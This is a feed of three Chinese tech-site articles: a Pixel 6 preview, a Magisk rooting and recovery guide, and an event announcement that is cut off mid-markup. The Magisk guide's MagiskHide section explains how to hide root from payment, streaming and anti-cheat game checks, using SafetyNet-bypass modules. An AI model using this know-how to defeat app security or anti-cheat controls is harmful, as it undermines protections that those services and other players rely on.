[{"title":"Google Pixel 6 系列提前官宣：6 个细节、6 种配色，还有很 6 的配置","date":"2021-08-03 09:30:00","description":"\n<p>或许 Google 也知道，每年年中到 10 月正式发布前的这段时间是 Google Pixel 新机爆料的巅峰，提前「官宣」预热这件事看来也从 Pixel 5 开始成为了一种传统 —— 8 月 3 日凌晨，Google 通过社交平台和官网正式公布了 Google Pixel 6 和 Pixel 6 Pro 的相关信息，The Verge 也同步上线文章披露了早些时候受邀在山景城总部体验新机的更多细节。</p>\n<p>今年的 Pixel 和往年有什么不一样？以上述信息来源为基础，本文这就为你一一梳理。</p>\n<h2>搭载 Tensor SoC，TPU 来到移动端</h2>\n<p>首先是芯片、同时也是本次 Google 预热活动的主角：自研芯片。</p>\n<p>Pixel 6 和 Pixel 6 Pro 都将搭载专为 Pixel 软件和硬件体验定制的 Tensor SoC，从 Sundar Pichai 在 Twitter 上晒出的 <a href=\"https://twitter.com/sundarpichai/status/1422228336533676035\" target=\"_blank\">照片</a> 来看，这块 SoC 比一枚回形针还要小。</p>\n<figure class=\"ss-imgRows\" figcaption=\"Tensor SoC 的概念图与实际产品\"><img src=\"https://cdn.sspai.com/2021/08/03/6d2b30c3d398af1d59a2a062b1a170c1.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/03/68348be14f47598427bcb088d89b4d4a.jpg\" alt=\"\"></figure><p>当 Google 用 Tensor 来进行命名一个东西时，你应该知道这玩意和 AI 一定有着极强的关联性，比如专门用于机器学习加速的 TPU 张量处理单元（Tensor Processing Unit），再比如开源机器学习框架 TensorFlow。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44fs45b34tar6a1osag.png\"><figcaption>当初驱动 AlphaGo 的那块 GPU | 图：<a href=\"https://www.theverge.com/circuitbreaker/2016/5/19/11716818/google-alphago-hardware-asic-chip-tensor-processor-unit-machine-learning\" target=\"_blank\">The Verge</a></figcaption></figure><p>Pixel 6 系列所搭载的 Tensor SoC 也不例外。目前可以确认的是，Google 通过 Tensor SoC 将 TPU 正式从商用、服务器应用等领域带到了移动设备上，Tensor 集成了一块 Titan M2 安全芯片和一块专门用于移动端 AI 任务的 TPU 单元。</p>\n<h2>多摄图像合成，视频拍摄超越 iPhone</h2>\n<p>Google Pixel 在拍照这件事情上一直可以说是由算法驱动的产品，也向来擅长将硬件上的不可能转换为数据问题，然后利用算法去解决这些数据问题。</p>\n<p>因此在 The Verge 所看到的内部 Demo 中，Google 自然也展示如何通过 TPU 来提升拍照体验。比如在 Pixel 6 上 TPU 会从超广角镜头捕捉到的高速快门图像中分析、提取人脸数据，然后将其合并到主镜头捕获、合成的 HDR 图像当中，如此一来即便拍摄对象处在运动过程当中，Pixel 6 也拍出一张动态范围出色、拍摄对象锐利清晰的好照片。</p>\n<p>而在另一组 Demo 中，Google 更是展示了一组由 Pixel 5、Pixel 6 和 iPhone 12 Pro Max 拍摄的 HDR 视频片段。在同样的拍摄场景下，TPU 能够将以往 Google 运用在静态图像捕获上的 <a href=\"https://github.com/google/hdrnet\" target=\"_blank\">HDRNet</a> 框架实时应用到每一帧视频拍摄当中，The Verge 也表示横向对比下来 Pixel 6 所拍摄的视频片段拥有最为自然的亮部、暗部细节和白平衡表现。</p>\n<p>Pixel 系列此前一直比较糟糕的视频拍摄环节似乎能被 TPU 捡起来了？别着急，The Verge 特别提了一句，上面用来演示的 Pixel 6 视频片段依然是 4K30fps 的……除了图像处理这块 TPU 当然也能胜任其他 AI 和机器学习任务，包括自然语义、语音转文字等等，有理由相信 Google Assistant、Recorder 甚至 Gboard 输入法这些应用在 Pixel 6 也会拥有更出色的体验（尽管对于非英语语言用户来说很有可能没什么用）。</p>\n<h2>CPU、GPU 信息未知，性能「市场领先」</h2>\n<p>奥斯特罗也透露 Tensor SoC 上还有一块用于处理低等级、低功耗任务的协处理器 always-on computer，Pixel 6 的主动显示（Ambient Display）功能也将由这个处理器驱动。不知道相比 Pixel 4 基于 Motion Sense 的主动显示，always-on computer 在功耗表现和体验上会不会有提升。</p>\n<p>关于这块 SoC，其余部分如 CPU、GPU 和 5G 基带等由哪家厂商设计虽然目前还不得而知，但 Google 硬件与服务部门高级副总裁瑞克·奥斯特罗（Rick Osterloh）向 The Verge 披露说，这块 SoC 拥有「行业领先」（market leading）的 CPU 和 GPU 性能表现，不过比起传统硬件参数上的竞争力，他对 Tensor SoC 在 AI 性能上的表现显然更有信心。</p>\n<h2>后摄设计是「打不过就加入」的产物</h2>\n<p>后置相机方面，Pixel 6 搭载超广角双摄，Pixel 6 Pro 额外多出一枚支持 4 倍光学变焦的长焦镜头。尽管没有给出镜头传感器的具体参数，两款手机的主摄传感器的确是更新了。奥斯特罗表示主摄广角镜头的传感器进光量提升了 150%，但并没有给出具体的参考对象，如果对比的是 Pixel 5 的 IMX363，大家应该可以推测一下这次的主摄传感器型号？</p>\n<p>在没有具体参数信息的情况下，Pixel 6 系列的后置相机模组设计自然就成为了本次「官宣」最大的看点。正如此前的网络爆料一样，Pixel 6 系列采用了类似当年 Nexus 6P 那样的条状、全黑、凸起的后置摄像头模组设计，位于机身中上部，从机身左侧中框一直延伸到右侧中框，视觉冲击力不小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44fs4lb34tarbb3pl8g.jpeg\"><figcaption>Google Pixel 6 Pro</figcaption></figure><p>在智能手机背后放下多摄模组的设计方案的确不多了，而 Pixel 6 系列的设计应该比其他任何一款 Android 设备都更像「跷跷板」。作为当初在发布会上盛赞 Pixel 3 XL 设计惊艳四座（absolutely terrific）的男人，奥斯特罗这次也放出了名言 —— 他告诉 The Verge，Pixel 6 的设计其实是一种「打不过就加入」思路的产物，有种与其扭扭捏捏、遮遮掩掩，不如 <i><strong>celebrate and highlight</strong></i>，大胆拥抱、张扬个性的意思在里面……</p>\n<h2>高配高价、做工更好，将大力投入市场营销</h2>\n<p>除了上面提到的「行业领先的 CPU 和 GPU」，Pixel 6 将搭载一块 6.4 英寸、 90Hz 刷新率、FHD+ 分辨率直屏，Pixel 6 Pro 则采用一块 6.7 英寸、120Hz 刷新率、QHD+ 分辨率的曲面屏，两款手机均配备屏下指纹识别，前置摄像头也都采用居中打孔方案，从 Google 放出的演示动画来看孔径并不算小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44fs4tb34tasob6ht5g.gif\"><figcaption>当然了，首发搭载基于 Material You 的 Android  12</figcaption></figure><p>事实上，自 Pixel 品牌成立 Google 已经做了 5 年手机。因为在配置、设计和产品定位等问题上的摇摆不定，怀疑 Google 究竟有没有认真做手机的人不在少数。好在从各种已知信息来看，Pixel 6 系列肯定要比 Pixel 5 更像「高端」产品一点，奥斯特罗在这里做了一个非常有意思的坦白：</p>\n<blockquote><p>我知道我们过去做的手机看上去都不怎么像高端手机的样子，但这次我感觉我们有了。</p></blockquote>\n<p>参与内部展示的 The Verge 编辑也表示尽管上手的是原型机，但 Pixel 6 系列的做工相比以往有了很明显的提升。不过与之对应的，价格应该也不会再像 Pixel 5 那么「亲民」了 —— 奥斯特罗表示 Pixel 6 将会是一款拥有旗舰定价（premium-priced）的产品，The Verge 认为这种说法可能也就意味着定价会在 1000 美元往上了。</p>\n<p>另外，Pixel 系列在美国市场中的份额一直在个位数以下，既然做了一款（Google 自己认为还不错的）旗舰手机，奥斯特罗也表示接下来将会像三星和 Apple 那样投入大量成本在产品营销上，希望可以将能够争取到的市场份额都争取到。</p>\n<h2>6 种配色，两款产品挺好区分</h2>\n<p>最后，因为摄像头模组设计的存在，Pixel 标志性的撞色设计也在 Pixel 6 系列上正式回归。其中 Pixel 6 提供红、绿、黑 3 种配色可选，Pixel 6 Pro 提供黄、白、黑 3 种配色可选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44fs5lb34tar307ku3g.jpeg\"><figcaption>全系合影</figcaption></figure><p>尽管设计相仿、配色数量相当，从漆黑一片的后置摄像头模组中也很难区分究竟有没有那多出来的一枚长焦镜头，但 Pixel 6 和 Pixel 6 Pro 其实也是很好区分的。</p>\n<p>最为直接的方法就是看摄像头模组上方的机身后盖区域：Pixel 6 Pro 的顶部留白区域要比 Pixel 6 更多一点；从主观上来说，Pixel 6 的配色要更活泼一些；此外，Pixel 6 拥有和 Pixel 4 系列相似的磨砂中框包裹设计，Pixel 6 Pro 则没有。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/f0d08b0b2e7717237aee509b7a93916c.jpg\"><figcaption>Pixel 6 的磨砂中框</figcaption></figure><p>那么你更喜欢哪一款、哪种配色呢？</p>\n<p><strong>参考链接：</strong></p>\n<ul>\n<li><a href=\"https://www.theverge.com/2021/8/2/22605094/google-pixel-6-pro-tensor-processor-specs-ai-ml\" target=\"_blank\">Google Pixel 6 and 6 Pro phones announced with custom Tensor chips - The Verge</a></li>\n<li><a href=\"https://blog.google/products/pixel/google-tensor-debuts-new-pixel-6-fall/\" target=\"_blank\">Google Tensor debuts on the new Pixel 6 this fall (blog.google)</a></li>\n<li><a href=\"https://store.google.com/us/magazine/google_pixel_6\" target=\"_blank\">Google Store</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68074"},{"title":"Android 玩家必备神器入门：Magisk 核心功能和翻车自救指南","date":"2021-08-03 07:51:15","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>作为一个拥有和管理系统最高权限的应用，Magisk App 有一定的使用门槛。差若毫厘，谬以千里，如果不清楚某个开关代表的意义，一个小小的误操作就有可能引发无法开机的严重后果。本文将从官方文档与个人经验出发，为大家介绍 Magisk App。</p>\n<p>文章内容和截图基于 Magisk v23，涵盖新 Magisk App 的四个主要功能：安装和卸载 Magisk；授予应用 Root 权限；隐藏 Magisk；获取和管理模块。在奔向 Magisk 的自由天地前，强烈建议你先阅读此文了解少数情况下的应对措施，这也是本文出现在模块推荐文章之前的原因。如果你还不知道如何刷入 Magisk 的话，可以参考上一篇文章。</p>\n<p>拓展阅读：<a href=\"https://sspai.com/post/67932\" target=\"_blank\">Android 玩家必备神器入门：从零开始安装 Magisk</a></p>\n<h2>安装和卸载 Magisk</h2>\n<p>Magisk App 第一屏便是负责 Magisk 镜像安装和卸载的界面。这个页面的功能往往和具体的使用场景绑定在一起，因此，下文用四个不同的情境来介绍 App 这个界面下的几个重要功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egjlb34tasob6hsk0.png\"></figure><h3>情境一：安装 Magisk 到原系统</h3>\n<p>上一篇 <a href=\"https://sspai.com/post/67932\" target=\"_blank\">从零开始安装 Magisk</a> 的文章中，我们遇到的就是这种情境。结合 Ramdisk 的值，使用 Magisk 图标旁的「安装」&gt; 「选择并修补一个文件」功能，Magisk 会修改我们提取的镜像供我们用 <code>fastboot flash </code>刷入或者<code> fastboot boot </code>引导进入系统。</p>\n<p>这是 Magisk App 最为基本的用途，除了少部分新机型外，这也是刷入 Magisk 最稳妥的方式。在每一次更新系统后，我们都推荐按此流程重新刷入。</p>\n<h3>情境二：Magisk 需要更新或者修复</h3>\n<blockquote><p>在 Magisk v22 之前，每一次新版本发布都会提供 magisk.zip 与 magisk.apk 两个文件，前者代表着将被注入到系统的 Magisk 本体，后者则代表着用于管理和使用 Magisk 的应用。因此每一次打包 boot.img 镜像或是直接刷入到系统前，都需要下载一次托管于 GitHub 的 magisk.zip，十分不便。</p></blockquote>\n<blockquote><p>在 Magisk v22 后，.zip 包与 .apk 包合二为一，安装的 Magisk App 本体自带了刷写功能，更新了应用本体即等于更新了即将准备注入到系统的 Magisk，不必频繁请求网络下载。</p></blockquote>\n<p>在检测到系统已经刷入 Magisk 后，Magisk 图标旁的「安装」子界面会多出一个「直接安装」选项。「直接安装」会将<strong>和 App 相同版本的镜像</strong>刷入系统。如果 Magisk 的一些功能莫名其妙地失效，可以尝试使用此功能重新挂载 Magisk。</p>\n<p>而如果需要更新的话，按照前文提到的流程，只需要先在应用内根据提示更新 App 本体，再点击「升级」按钮就能自动刷入。</p>\n<h3>情境三：进行系统 OTA</h3>\n<p>系统在下载更新包后，会在安装前进行系统的完整性检查。很多 Root 工具因为修改了底层文件，导致系统无法通过此项检查而不能安装 OTA。Magisk 的优势正是「挂载」而非「改写」。当然，想要完成 OTA 还需要我们的手动操作。</p>\n<p>首先，为了防止系统自动安装更新导致更新失败，刷入 Magisk 后的第一步就是关闭系统的「自动安装更新」选项。类 AOSP 的系统中，这个项目一般位于「开发者选项」界面；改动比较大的系统中，这个选项可能位于系统更新 App。</p>\n<p>读者应该记得，我们在安装 Magisk 时的确修改了系统的 boot.img 或者 recovery.img。因此，在收到厂商推送的更新后，我们需要点击 Magisk App 首页的「卸载 Magisk」&gt;「还原原厂镜像」（不要重启）来恢复原来的镜像。此时理论上 OTA 应该能够正确安装。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egjtb34tarbb3pktg.png\"><figcaption>禁止更新图片来自官方文档</figcaption></figure><p>下载 OTA 并安装后，系统会提示重启，重启后我们会失去 Magisk。因而我们还需要按照上一篇文章「打包镜像并刷入」章节中提到的提取镜像 &gt; 修改镜像 &gt; 刷入/引导启动镜像的方式再次安装 Magisk。</p>\n<p>和 Magisk 本体不同，模块不需要重新安装。Magisk 将模块储存在一个文件夹（<code>/data/adb/modules</code>）中，每次设备开机时，Magisk 会自动挂载该文件夹下的模块。原厂镜像无法挂载这些模块，但并不意味着这些模块文件被删除了；只要重新安装 Magisk，这些「蜇伏」的模块又能生龙活虎。</p>\n<p>根据多年以来的刷机经验，分享给诸位一些重装时的技巧：</p>\n<ol>\n<li>并非每一次系统更新都会大幅改动 boot.img 或 recovery.img，也就是说，旧系统被 Magisk 打包过的镜像也极有可能顺利引导启动新系统。如果我们事先保存或者备份过旧系统中经 Magisk 修改过的镜像<code> magisk.img</code>，系统更新后，在 bootloader 界面下用 <code>fastboot boot magisk.img</code> 尝试引导启动旧镜像，若系统和 Magisk 都正常，那么就不必再费心思提取新系统的镜像，点击「安装」&gt;「直接安装」，此时「直接安装」的对象是新系统的分区，这样我们就能顺利为新系统刷入 Magisk 。</li>\n<li>Magisk App 能在 <a href=\"https://sspai.com/post/53075\" target=\"_blank\">A/B 分区设备</a>上保留 Magisk 进行系统更新。若 App 首页的 A/B 一栏值为「是」，我们只需要在重启安装 OTA 前点击 「安装」&gt;「安装到未使用的槽位」选项即可。不过，经知名用户 Clyde 反映，部分在 OTA 时带有分区校验的系统，<a href=\"https://twitter.com/topjohnwu/status/1303574238796808192\" target=\"_blank\">如 Pixel 的 ROM 使用此方法大概率会发生引导循环</a>。出现相关问题还是直接一点，转用上文提到的通用刷入方式。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/b897cb6bc4bee26aaec152c575f62df3.png\"></figure><p>携 Magisk 进行系统 OTA 的流程可以总结为：<strong>关闭「自动安装更新」&gt; 收到 OTA &gt;「卸载 Magisk」/「还原原厂镜像」&gt; 下载并安装 OTA &gt;</strong></p>\n<ul>\n<li><strong>A/B 分区为「是」的设备：不重启 &gt;「安装」&gt; 「安装到未使用的槽位」&gt; 重启以更新系统。</strong></li>\n<li><strong>其他设备：重启以更新系统 &gt; 重新安装 Magisk。</strong></li>\n</ul>\n<p>如果遇到无法更新的问题，尝试不清除用户数据的刷写系统全量包方式，而后重新安装 Magisk。一加等机型在检测到 Magisk 后会自动下载全量包。常备全量包，翻车不慌张。</p>\n<h3>情境四：完全卸载 Magisk</h3>\n<p>在「卸载 Magisk」命令下还有一个「完全卸载」，点击此命令会在重启设备后卸载一切已经安装的模块和 Magisk 本身。</p>\n<p>这个命令仅在我们想和 Magisk 说永别的时候用。想要卸载单个模块请参考本文第四章内容；Magisk 使设备出现问题时，建议排查 MagiskHide 和可疑模块，而非完全卸载。</p>\n<h2>授予应用 Root 权限</h2>\n<p>Android 是以 Linux 为内核的系统，在 Android 上获取 root 类似于在 Linux 上使用了 root 帐户。有了 root 权限，我们便能修改底层文件、注入脚本、调节系统性能、读取更详细的数据……当然，这一切并不需要我们手动去写脚本，我们需要做的只是通过 Magisk 将 root 权限授予给能够完成这些事情的应用们。</p>\n<p>索取 root 权限的请求由应用发起，Magisk 此时会跳出类似于 Windows UAC 的弹窗供用户确认。想要防止恶意应用模拟点击，可以在 Magisk App 的设置中开启「生物识别验证」和「点按劫持保护」两个选项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egktb34tar307ktig.gif\"></figure><p>授权了应用之后，Magisk 默认会在该应用使用 root 权限时弹出通知，并且记录相关的日志。这两个选项隐藏在 Magisk App 的超级用户界面中，通过单击已授权的应用名称，便能找到控制通知和日志的开关。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egllb34tar307ktj0.gif\"></figure><p>用户授予 root 权限是将手机的完整控制权交给这个应用，因此请务必保证此应用值得信任。如果你在主力机上使用 root 权限，更应该保持克制和敬畏。</p>\n<p>此处另外提一些关于授予 root 权限的小技巧：</p>\n<ul>\n<li>不少应用索取 root 其实只是为了获得系统底层的部分权限，这部分授权其实无需 root，我们大可以用 adb 输入一次命令授予，比如我们之前聊过的 <a href=\"https://sspai.com/post/67475\" target=\"_blank\">Buoy</a>，或是 Gsam Battery Monitor 等电池监控类应用。</li>\n<li>Root 被认为是一种低效、慢速的处理方式，<a href=\"https://shizuku.rikka.app/zh-hans/download/\" target=\"_blank\">Shizuku</a> 应运而生。它可以被当作 root 权限与需要 root 权限的应用之间的「中间商」，通过 root/adb 提升权限后，再为那些需要使用系统 API 与 adb 权限的应用授权，这比 root 权限更高效。如果你在使用「小黑屋」、「冰箱」、「App Ops」等应用，建议先安装 Shizuku 后再通过它来为这些应用授权。</li>\n</ul>\n<p>拓展阅读：<a href=\"https://sspai.com/post/61348\" target=\"_blank\">在权限管理上跑过 iOS 14 和 Android 11：App Ops 4.0 上手指南</a>、<a href=\"https://shizuku.rikka.app/zh-hans/introduction/\" target=\"_blank\">Shizuku 简介</a></p>\n<h2>通过 MagiskHide 隐藏 Magisk</h2>\n<p>正因为 root 权限和将要提到的模块所带来的潜在危害，一些涉及版权、金融、通讯功能的应用会事先检查系统是否「完整」，它们若发现系统已 root 或者挂载了一些模块，会以此为由弹出警告乃至直接退出，还可能会对用户可获取的内容做一些限制。为了解决这类应用对用户所造成的不便，Magisk 设计了 MagiskHide 功能。</p>\n<p>首先，点击 App 首页右上方的齿轮，勾选「MagiskHide」，这时，Magisk 超级用户界面会多出一个 MagiskHide 子界面。</p>\n<p>在针对应用隐藏 Magisk 前，我们可以先试试检验设备能否能通过位于 App 首页的「测试 SafetyNet 证明」。点击位于首页的测试按钮，第一次测试需要下载额外的组件，测试还要求设备能正常访问 Google，因此<strong>请确保网络正常</strong><sup class=\"ss-footnote\" href=\"\" title=\"若出现网络通讯上的错误，Magisk App 将会提示「API 错误」\" footnote-id=\"1\">1</sup>。不出意外的话，不久后会弹出「通过证明」的文字。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egmdb34tar307ktjg.png\"></figure><p>如果 basicIntegrity 没有通过，说明系统镜像完整性有问题，这一般发生在第三方 ROM 中，我们可以尝试安装 <a href=\"https://github.com/kdrag0n/safetynet-fix\" target=\"_blank\">Universal SafetyNet Fix</a> 模块或者更换 ROM 来解决这个问题。如果 ctsProfile 没有通过，大概率是设备或 ROM 未经认证。安装 <a href=\"https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf\" target=\"_blank\">MagiskHide Props Config</a> 模块一般能解决此问题<sup class=\"ss-footnote\" href=\"\" title=\"https://www.didgeridoohan.com/magisk/MagiskHideSafetyNet\" footnote-id=\"2\">2</sup>。模块的安装请跳转到第四章查阅。</p>\n<p>确认 SafetyNet 测试通过后，接下来我们勾选想对其隐藏 root 事实的应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egmlb34tar307ktk0.png\"></figure><p>一般说来，下列四类应用常常有 root 检测行为和反制措施：</p>\n<ol>\n<li>提供版权和地区限制内容的应用：如 Google Play 检测到 root 后，设备会变成「未认证」状态，我们将无法搜索到 Netflix 等流媒体应用。</li>\n<li>支付应用：如云闪付，该应用在检测到 root 后会弹出警告，并直接隐藏指纹支付选项。</li>\n<li>通讯应用：如 ZohoMail，它会在检测到 root 后提示用户登出。</li>\n<li>游戏：部分游戏有严格的反作弊机制，检测到 root 后可能拒绝用户游玩。</li>\n</ol>\n<p>通过自己实际遇到的问题或者是翻阅网络资料，我们可以确定对哪些应用隐藏 Magisk。在 MaigskHide 界面直接点击某应用的选择框，Magisk 会自动为我们勾选应用下的组件。如果在勾选之前就已经打开过该应用，我们可能还需要清除一次应用的缓存乃至数据。</p>\n<p>根据作者的说法，此功能属于「dirty hack」，在使用时应尽量保持克制。<strong>不含有 root 检测机制的应用，不建议勾选。</strong></p>\n<p>如果在上述设置后，还发现有应用检测到 root 权限，我们可以打开 Magisk 设置里的「隐藏 Magisk 应用」选项。点选后，Magisk 会更改自己的应用名，用户需要通过搜索或者创建的快捷方式访问改名后的 Magisk App。这样能防止在低版本系统中，部分应用扫描用户应用列表时检测到 Magisk 进而判定系统已 root。</p>\n<h2>获取和管理模块</h2>\n<p>模块是大部分用户选择安装 Magisk 的原因，它们是一个个开箱即用的系统修改包或修改包的组件。模块既可以从 Magisk App 中自动下载安装，也可以从网络下载然后手动安装，部分拥有 root 权限的应用还可以越过用户的授权直接安装模块。</p>\n<p>由于不同的 Android 设备差异实在太大，同样的模块难以保证完美适用于所有设备；不同的模块、应用和用户对系统的其他修改有时候会产生冲突，进而导致一系列严重问题；一些模块本身也像应用那样，需要有一个逐渐完善的过程；也有的模块本来就是不完整的，需要其他模块的辅助。因此，安装模块千万要遵循流程。设备出现问题后也不要慌，有的是简单且易操作的解决方案。</p>\n<h3>安装模块的基本流程</h3>\n<p>安装模块分三步：阅读模块说明 &gt; 确认相关依赖状态 &gt; 安装模块并重启。这三步中，最重要的当属第一步，因为它直接决定了当前模块是否符合自己的需求，能不能安装使用。下面以能在 Magisk App 找到的内容拦截模块 Energized Protection 为例，详细讲解这三步。</p>\n<p>我们进入 Magisk App 的第四屏模块界面，利用搜索找到 Energized Protection。点击模块右下的文件夹图标即可阅读它的说明。由于是从 GitHub 上获取，如果模块说明无法加载，你可以尝试开启设置中的「安全 DNS」。这些应用内模块实际上都托管在 <a href=\"https://github.com/Magisk-Modules-Repo\" target=\"_blank\">Magisk Modules</a> 库下，我们也可以选择使用电脑访问 <a href=\"https://github.com/Magisk-Modules-Repo/energizedprotection\" target=\"_blank\">相关的 Repo</a> 来阅读模块说明。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egmtb34tasob6hsl0.png\"></figure><p>模块说明中最重要的是两部分内容：模块的依赖和用法。许多模块是协同其他模块或 App 工作，在安装这些模块之前，必须确定相关依赖的状态。例如，Energized Protection 告诉我们它需要 Systemless Hosts 这个模块，Magisk 20.4 之前的版本还需要安装 Busybox for Android NDK。它使用的方法是命令行，因而我们还需要一个 Android 平台的终端，比如说 <a href=\"https://termux.com/\" target=\"_blank\">Termux</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44egndb34tasob6hslg.png\"></figure><p>确认这些依赖都装好了之后，点击「安装」，重启系统，这个模块才算安装完成。如果安装的模块和你素未谋面，那么本文不建议一口气安装很多个。</p>\n<p>不在 App 列表中的模块，例如 <a href=\"https://github.com/simonsmh/notocjk\" target=\"_blank\">NotoCJK</a>，模块说明在发布处，安装模块需要使用模块界面最上方的「从本地安装」命令，然后选择下载的模块压缩包。</p>\n<h3>模块翻车后的自救</h3>\n<p>安装模块后手机出现应用闪退、显示错误和无法开机等种种异常，大概率是使用的某个模块出了问题。针对不同情况，目前有五种比较简单的自救方式：</p>\n<ul>\n<li>如果还能访问 Magisk App，在模块界面中，「移除」出问题的模块，然后重启以完全卸载此模块。</li>\n<li>如果已经无法打开 Magisk App，但能使用 adb，用数据线连接电脑，输入 <code>adb wait-for-device shell magisk --remove-modules</code>，这会删除所有模块并重启。</li>\n<li>如果连 adb 都不能访问，那么请尝试进入安全模式。不同机型安全模式启用方式不同：开机状态下，比较常见的启用方式是按住电源键呼出的重启按钮；关机状态下，一般能通过特定的实体按键激活。进入安全模式后，Magisk 会自动禁用所有模块。再重启一次，模块禁用的状态会被保留，设备应当能恢复正常。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/15f283101772f70b27e6099c340e3031.gif\"></figure><ul><li>如果装有第三方 Recovery，利用 Recovey 的文件管理功能（高级 &gt; 文件管理），定位到<code>/data/adb/modules</code>，将其中的问题模块重命名为「remove」，Magisk 会在重启时自动卸载该模块。更简单粗暴的方式是直接删除该目录下问题模块文件。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/ee86a61352c063df9441321297e88646.png\"></figure><ul><li>装有第三方 Recovey 时，我们还能将 Magisk.apk 重命名为<code>uninstall.zip </code>，在 Recovery 下刷入，这可以完全卸载 Magisk，潇洒弃坑走人。</li></ul>\n<p>Magisk 让设备具有了极高的自由度的同时，也让其承担着很大的风险。但欲戴其冠，必承其重，因此本文在展示 Magisk App 的四项核心功能的同时，也附带阐述了如何携 Magisk 正常进行 OTA，如何解决模块翻车等重要问题。</p>\n<p>这些应当措施能最大限度地保证设备数据的安全，不过想要防「翻车」于未然，最重要的还是提高自己的鉴别能力与信息搜集能力，谨慎对待那些来源可疑的模块和应用。</p>\n<p>我们模块推荐篇见。</p>\n<p><strong>扩展阅读</strong></p>\n<ul>\n<li>官方 FAQ：https://topjohnwu.github.io/Magisk/faq.html</li>\n<li>系统 OTA 的官方说明：https://topjohnwu.github.io/Magisk/ota.html</li>\n<li><a href=\"https://sspai.com/post/67932\" target=\"_blank\">Android 玩家必备神器入门：从零开始安装 Magisk</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68071"},{"title":"一派 · 线下分享会 | 两年不见，这次我们想和你聊聊极客与好物","date":"2021-08-03 06:56:58","description":"\n<p>大家好，一转眼已经两年不见，甚是想念。上一次见面后，我们已经积累了数场线下活动的经历，也计划着未来在不同城市举办更多类似的活动，与大家共同畅谈当下，畅想未来。殊不知突如其来的疫情，迫使我们搁置下了所有线下活动的规划。</p>\n<p>两年过去了，或许大家感受到少数派「不太一样了」，其实主要不一样在越来越多元的选题种类：家的与众不同、被量化的烹饪技巧，甚至老麦开着特斯拉带着大家云游了一遭西藏高原。但追本溯源，少数派一直是那个少数派，我们独特但不特立独行，接纳却也不断碰撞着新的火花。</p>\n<p>眼见 2021 过半，我们迫不及待想要与大家见见。这次我们想邀请各位一道，开启一个年轻的选题——天猫同好派联合 Intel 酷睿发起的「次世代极客好物体验会」，而少数派将与两个次世代助力者一道探讨次世代极客精神、次世代极客好物。</p>\n<p>过去极客定义了时代，一大批科技领域的热衷者成为时代的佼佼者。</p>\n<p>如今，次世代以一己之力为极客精神、极客好物注入了新内涵和新能量，代表次世代极客精神的极客好物已经不仅仅是某种高科技物品，更是某种个性鲜明的态度、思想，并融到生活当中。作为次世代极客领地的天猫同好派和 Intel 酷睿，深刻洞悉次世代极客对「芯片/AI 等议题」高度敏感，他们借由次世代极客好物打造「虚拟世界」、称霸电竞游戏、锻造硬核灵魂画手......</p>\n<p>由此，Intel 酷睿&amp;天猫同好派以「次世代极客超神博物发布会」为主题概念，携手知名虚拟偶像、三大 B 站 up 主、N+ 极客达人共同演绎 95 后理想芯生活，缔造首个全网共创的万人万芯#次世代极客#超神博物发布会；线下，联合少数派打造首个 95 后从文化、精神到好物的全方位次世代极客好物体验会，引领「次世代极客」理想生活芯选择。</p>\n<p>而对少数派来说，「极客」是我们长时间以来的刻板印象，而代表着生活方式的「好物」也是我们现在极力突破的新内容方向，与其常在网上讨论少数派的变与不变，不妨我们面对面一起聊聊这是与不是？</p>\n<h2><strong>活动嘉宾</strong></h2>\n<p>在这次活动中，我们除了可以一同畅聊「次世代极客」与「好物」，还能见到很多有趣的，以次世代极客为代表的分享嘉宾，他们都是在各自领域有着一定建树，却也不满足于此而不断变革的优秀青年。</p>\n<h3>老麦</h3>\n<figure class=\"image ss-img-wrapper\"><img 